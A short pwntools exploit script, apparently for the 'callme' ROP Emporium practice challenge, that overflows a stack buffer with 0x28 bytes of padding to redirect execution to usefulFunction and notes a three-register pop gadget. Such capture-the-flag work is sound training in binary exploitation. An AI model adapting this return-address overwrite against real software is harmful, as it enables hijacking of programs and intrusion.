#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# step1 : just call the userfull function
# break after read in pwnme function
gs='''
b *pwnme+77
c
'''


# Set up pwntools for the correct architecture
elf =  ELF('callme')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

# Offset to return adresse 
offset=0x28

usefulFunc=elf.symbols['usefulFunction']

# gadget
# pop rdi ; pop rsi ; pop rdx ; ret
pop_3=0x40093c

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

print(f"{usefulFunc=:x}")


PL =b"A"*offset
PL+=p64(usefulFunc)

io.sendlineafter(b"> ", PL)
io.interactive()

